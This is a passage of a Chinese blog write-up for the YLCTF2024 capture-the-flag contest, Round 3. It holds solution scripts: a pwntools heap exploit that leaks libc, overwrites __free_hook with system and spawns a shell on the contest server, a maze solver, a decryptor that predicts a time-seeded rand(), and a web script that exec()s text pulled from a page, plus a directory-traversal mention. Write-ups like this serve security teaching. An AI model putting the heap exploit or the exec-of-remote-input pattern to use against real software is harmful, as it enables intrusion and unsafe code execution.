</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;:&#39;</span>)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>p<span style=color:#f92672>.</span>sendline(str(<span style=color:#ae81ff>2</span>))
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;Index: &#34;</span>)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>p<span style=color:#f92672>.</span>sendline(str(index))
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;Content: &#34;</span>)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>p<span style=color:#f92672>.</span>sendline(content)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>exploit</span>(self):
</span></span><span style=display:flex><span>        <span style=color:#75715e># Initial heap setup</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>9</span>):
</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>add(i, <span style=color:#ae81ff>0x90</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>8</span>):
</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>free(i)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>7</span>):
</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>add(i, <span style=color:#ae81ff>0x90</span>)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>add(<span style=color:#ae81ff>7</span>, <span style=color:#ae81ff>0x88</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>show(<span style=color:#ae81ff>7</span>)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>libc_base <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>get_addr64() <span style=color:#f92672>-</span> <span style=color:#ae81ff>4111664</span>
</span></span><span style=display:flex><span>        print_info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Libc base: </span><span style=color:#e6db74>{</span>hex(self<span style=color:#f92672>.</span>libc_base)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>get_libc_offsets()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>add(<span style=color:#ae81ff>9</span>, <span style=color:#ae81ff>0x18</span>)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>add(<span style=color:#ae81ff>10</span>, <span style=color:#ae81ff>0x68</span>)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>add(<span style=color:#ae81ff>11</span>, <span style=color:#ae81ff>0x68</span>)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>add(<span style=color:#ae81ff>12</span>, <span style=color:#ae81ff>0x68</span>)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>add(<span style=color:#ae81ff>13</span>, <span style=color:#ae81ff>0x18</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>edit(<span style=color:#ae81ff>9</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x18</span> <span style=color:#f92672>+</span> p8(<span style=color:#ae81ff>0xe1</span>))
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>free(<span style=color:#ae81ff>10</span>)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>add(<span style=color:#ae81ff>10</span>, <span style=color:#ae81ff>0xd8</span>)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>free(<span style=color:#ae81ff>12</span>)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>free(<span style=color:#ae81ff>11</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>edit(<span style=color:#ae81ff>10</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x68</span> <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0x71</span>) <span style=color:#f92672>+</span> p64(self<span style=color:#f92672>.</span>free_hook))
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>add(<span style=color:#ae81ff>14</span>, <span style=color:#ae81ff>0x68</span>)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>add(<span style=color:#ae81ff>15</span>, <span style=color:#ae81ff>0x68</span>)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>edit(<span style=color:#ae81ff>15</span>, p64(self<span style=color:#f92672>.</span>system))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>edit(<span style=color:#ae81ff>9</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/bin/sh</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>free(<span style=color:#ae81ff>9</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>p<span style=color:#f92672>.</span>interactive()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
</span></span><span style=display:flex><span>    exp <span style=color:#f92672>=</span> Exploit(is_remote<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>)
</span></span><span style=display:flex><span>    exp<span style=color:#f92672>.</span>exploit()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>    main()
</span></span></code></pre></div><p><img alt=null loading=lazy src=/posts/ctf/ylctf2024/null.png></p><h4 id=re-2>Re</h4><h5 id=round-3-ezmaze一血>[Round 3] ezmaze(一血)</h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> hashlib
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> collections <span style=color:#f92672>import</span> deque
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>visualize_maze</span>(maze_str, width<span style=color:#f92672>=</span><span style=color:#ae81ff>10</span>):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;Visualize the maze in a grid format.&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>join(maze_str[i:i <span style=color:#f92672>+</span> width] <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>, len(maze_str), width))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>is_valid_move</span>(maze, pos):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;Check if the current position is valid.&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>&lt;=</span> pos <span style=color:#f92672>&lt;</span> len(maze) <span style=color:#f92672>and</span> maze[pos] <span style=color:#f92672>in</span> [<span style=color:#e6db74>&#39;+&#39;</span>, <span style=color:#e6db74>&#39;F&#39;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>solve_maze</span>():
</span></span><span style=display:flex><span>    maze <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;*****++*********+******+*++******+++*****F*+*******+*+++*****+***++****+***+*****+***+*+***+++++++************&#34;</span>
</span></span><span style=display:flex><span>    start_pos <span style=color:#f92672>=</span> <span style=color:#ae81ff>5</span>
</span></span><span style=display:flex><span>    moves <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#39;w&#39;</span>: <span style=color:#f92672>-</span><span style=color:#ae81ff>10</span>, <span style=color:#e6db74>&#39;s&#39;</span>: <span style=color:#ae81ff>10</span>, <span style=color:#e6db74>&#39;a&#39;</span>: <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#39;d&#39;</span>: <span style=color:#ae81ff>1</span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    queue <span style=color:#f92672>=</span> deque([(start_pos, <span style=color:#e6db74>&#34;&#34;</span>)])
</span></span><span style=display:flex><span>    visited <span style=color:#f92672>=</span> {start_pos}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> queue:
</span></span><span style=display:flex><span>        pos, path <span style=color:#f92672>=</span> queue<span style=color:#f92672>.</span>popleft()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> maze[pos] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;F&#39;</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> path
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> move_char, move_val <span style=color:#f92672>in</span> moves<span style=color:#f92672>.</span>items():
</span></span><span style=display:flex><span>            new_pos <span style=color:#f92672>=</span> pos
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>while</span> is_valid_move(maze, new_pos <span style=color:#f92672>+</span> move_val):
</span></span><span style=display:flex><span>                new_pos <span style=color:#f92672>+=</span> move_val
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> new_pos <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> visited:
</span></span><span style=display:flex><span>                    visited<span style=color:#f92672>.</span>add(new_pos)
</span></span><span style=display:flex><span>                    queue<span style=color:#f92672>.</span>append((new_pos, path <span style=color:#f92672>+</span> move_char))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>verify_solution</span>(solution):
</span></span><span style=display:flex><span>    maze <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;*****++*********+******+*++******+++*****F*+*******+*+++*****+***++****+***+*****+***+*+***+++++++************&#34;</span>
</span></span><span style=display:flex><span>    pos <span style=color:#f92672>=</span> <span style=color:#ae81ff>5</span>
</span></span><span style=display:flex><span>    move_map <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#39;w&#39;</span>: <span style=color:#f92672>-</span><span style=color:#ae81ff>10</span>, <span style=color:#e6db74>&#39;s&#39;</span>: <span style=color:#ae81ff>10</span>, <span style=color:#e6db74>&#39;a&#39;</span>: <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#39;d&#39;</span>: <span style=color:#ae81ff>1</span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> action <span style=color:#f92672>in</span> solution:
</span></span><span style=display:flex><span>        move <span style=color:#f92672>=</span> move_map[action]
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>while</span> is_valid_move(maze, pos <span style=color:#f92672>+</span> move):
</span></span><span style=display:flex><span>            pos <span style=color:#f92672>+=</span> move
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> maze[pos] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;F&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
</span></span><span style=display:flex><span>    solution <span style=color:#f92672>=</span> solve_maze()
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Found solution path: </span><span style=color:#e6db74>{</span>solution<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> verify_solution(solution):
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;Solution verified: Valid!&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;Solution verification failed!&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;YLCTF{&#34;</span> <span style=color:#f92672>+</span> hashlib<span style=color:#f92672>.</span>md5(solution<span style=color:#f92672>.</span>encode())<span style=color:#f92672>.</span>hexdigest() <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;}&#34;</span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Maze visualization (10x10 grid):&#34;</span>)
</span></span><span style=display:flex><span>    print(visualize_maze(<span style=color:#e6db74>&#34;*****++*********+******+*++******+++*****F*+*******+*+++*****+***++****+***+*****+***+*+***+++++++************&#34;</span>))
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Final flag:&#34;</span>, flag)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>    main()
</span></span></code></pre></div><h5 id=round-3-case>[Round 3] CASE</h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> ctypes
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> time
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 加载 libc</span>
</span></span><span style=display:flex><span>libc <span style=color:#f92672>=</span> ctypes<span style=color:#f92672>.</span>CDLL(<span style=color:#e6db74>&#34;libc.so.6&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 连接到靶机</span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#34;challenge.yuanloo.com&#34;</span>, <span style=color:#ae81ff>30037</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 用于保存加密值</span>
</span></span><span style=display:flex><span>enc <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> _ <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>43</span>):
</span></span><span style=display:flex><span>    response <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;,&#39;</span>)
</span></span><span style=display:flex><span>    enc<span style=color:#f92672>.</span>append(response<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>decode()<span style=color:#f92672>.</span>rstrip(<span style=color:#e6db74>&#39;,&#39;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;Encrypted values:&#34;</span>, enc)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>enc_values <span style=color:#f92672>=</span> [int(x, <span style=color:#ae81ff>16</span>) <span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> enc]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 用于保存解密的结果</span>
</span></span><span style=display:flex><span>decrypted <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>seed <span style=color:#f92672>=</span> int(time<span style=color:#f92672>.</span>time())
</span></span><span style=display:flex><span>libc<span style=color:#f92672>.</span>srand(seed)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(len(enc_values)):
</span></span><span style=display:flex><span>    v5 <span style=color:#f92672>=</span> libc<span style=color:#f92672>.</span>rand()
</span></span><span style=display:flex><span>    original_char <span style=color:#f92672>=</span> (enc_values[i] <span style=color:#f92672>^</span> (v5 <span style=color:#f92672>%</span> <span style=color:#ae81ff>255</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># 反向映射字符</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#ae81ff>65</span> <span style=color:#f92672>&lt;=</span> original_char <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>90</span>:  <span style=color:#75715e># A-Z</span>
</span></span><span style=display:flex><span>        decrypted_char <span style=color:#f92672>=</span> chr((original_char <span style=color:#f92672>+</span> <span style=color:#ae81ff>52</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>65</span>) <span style=color:#f92672>%</span> <span style=color:#ae81ff>26</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>65</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> <span style=color:#ae81ff>97</span> <span style=color:#f92672>&lt;=</span> original_char <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>122</span>:  <span style=color:#75715e># a-z</span>
</span></span><span style=display:flex><span>        decrypted_char <span style=color:#f92672>=</span> chr((original_char <span style=color:#f92672>+</span> <span style=color:#ae81ff>84</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>97</span>) <span style=color:#f92672>%</span> <span style=color:#ae81ff>26</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>97</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        decrypted_char <span style=color:#f92672>=</span> chr(original_char)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    decrypted<span style=color:#f92672>.</span>append(decrypted_char)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 输出解密结果</span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;Decrypted value:&#34;</span>, <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(decrypted))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 关闭连接</span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>close()
</span></span></code></pre></div><p>不知道具体的原理，要得到flag的话外面需要rot13内部需要rot7才能得到正确的flag，不太明白re，里面是根据uuid的特性得到的</p><p><img alt=case loading=lazy src=/posts/ctf/ylctf2024/case.png></p><h4 id=web-2>Web</h4><h5 id=round-3-404>[Round 3] 404</h5><p><code>/script.js</code>有提示，然后</p><p><img alt=404 loading=lazy src=/posts/ctf/ylctf2024/404.png></p><p>解密，最后在网页写个py交互一下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> bs4 <span style=color:#f92672>import</span> BeautifulSoup
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>session <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>Session()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;http://challenge.yuanloo.com:33968/ca.php&#39;</span>
</span></span><span style=display:flex><span>response <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>get(url) 
</span></span><span style=display:flex><span>soup <span style=color:#f92672>=</span> BeautifulSoup(response<span style=color:#f92672>.</span>text, <span style=color:#e6db74>&#39;html.parser&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pre_content <span style=color:#f92672>=</span> soup<span style=color:#f92672>.</span>find(<span style=color:#e6db74>&#39;pre&#39;</span>)<span style=color:#f92672>.</span>text<span style=color:#f92672>.</span>strip()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pre_content <span style=color:#f92672>=</span> pre_content<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;$temp1&#39;</span>, <span style=color:#e6db74>&#39;temp1&#39;</span>)<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;$temp2&#39;</span>, <span style=color:#e6db74>&#39;temp2&#39;</span>)<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;$temp3&#39;</span>, <span style=color:#e6db74>&#39;temp3&#39;</span>)<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;$temp4&#39;</span>, <span style=color:#e6db74>&#39;temp4&#39;</span>)<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;$answer&#39;</span>, <span style=color:#e6db74>&#39;answer&#39;</span>)
</span></span><span style=display:flex><span>pre_content <span style=color:#f92672>=</span> pre_content<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;log&#39;</span>, <span style=color:#e6db74>&#39;math.log&#39;</span>)<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;sqrt&#39;</span>, <span style=color:#e6db74>&#39;math.sqrt&#39;</span>)<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;pow&#39;</span>, <span style=color:#e6db74>&#39;math.pow&#39;</span>)<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;sin&#39;</span>, <span style=color:#e6db74>&#39;math.sin&#39;</span>)<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;cos&#39;</span>, <span style=color:#e6db74>&#39;math.cos&#39;</span>)<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;tan&#39;</span>, <span style=color:#e6db74>&#39;math.tan&#39;</span>)<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;exp&#39;</span>, <span style=color:#e6db74>&#39;math.exp&#39;</span>)<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;abs&#39;</span>, <span style=color:#e6db74>&#39;abs&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 计算表达式</span>
</span></span><span style=display:flex><span>exec(pre_content)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 输出最终答案，保留两位小数</span>
</span></span><span style=display:flex><span>final_answer <span style=color:#f92672>=</span> round(answer, <span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;答案: </span><span style=color:#e6db74>{</span>final_answer<span style=color:#e6db74>:</span><span style=color:#e6db74>.2f</span><span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 准备 POST 请求的数据</span>
</span></span><span style=display:flex><span>data <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;user_answer&#39;</span>: final_answer
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>post_url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;http://challenge.yuanloo.com:33968/ca.php&#39;</span> 
</span></span><span style=display:flex><span>response <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>post(post_url, data<span style=color:#f92672>=</span>data)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;POST 请求的响应: </span><span style=color:#e6db74>{</span>response<span style=color:#f92672>.</span>text<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span></code></pre></div><h5 id=round-3-pread>[Round 3] PRead</h5><p>目录穿越</p><p><img alt=pread loading=lazy src=/posts/ctf/ylctf2024/pread.png></p></div></div></div><button id=tocFab class=toc-fab type=button aria-label="Toggle TOC">目录</button><aside id=tocDrawer class=toc-drawer aria-hidden=true><div class=toc-drawer-head><div class=toc-drawer-title>目录</div><button id=tocClose class=toc-close type=button aria-label="Close TOC">×</button></div><nav class=toc-drawer-body><nav id=TableOfContents><ul><li><ul><li><ul><li><a href=#round-1>Round 1</a></li><li><a href=#round-2>Round 2</a></li><li><a href=#round-3>Round 3</a></li></ul></li></ul></li></ul></nav></nav></aside><script>(function(){const s=document.getElementById("tocFab"),e=document.getElementById("tocDrawer"),o=document.getElementById("tocClose");if(!s||!e)return;const t="pm_toc_open";function i(){e.classList.add("open"),e.setAttribute("aria-hidden","false");try{localStorage.setItem(t,"1")}catch{}}function n(){e.classList.remove("open"),e.setAttribute("aria-hidden","true");try{localStorage.setItem(t,"0")}catch{}}function a(){e.classList.contains("open")?n():i()}s.addEventListener("click",a),o&&o.addEventListener("click",n),document.addEventListener("keydown",e=>{e.key==="Escape"&&n()});try{localStorage.getItem(t)==="1"&&i()}catch{}})()</script><nav class=paginav><a class=prev href=http://blog.0ran9e.cn/posts/ctf/shctf2024/><span class=title>«</span><br><span>SHCTF2024</span>
</a><a class=next href=http://blog.0ran9e.cn/posts/ctf/moectf2024/><span class=title>»</span><br><span>moectf2024</span></a></nav></article></main><footer class=footer><span>© 2026
<a href=http://blog.0ran9e.cn/>0raN9e's Blog</a>· Powered by <a href=https://gohugo.io/>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod>PaperMod</a>· adapted by <span style=letter-spacing:.12em>0ran9e</span></span></footer></body></html>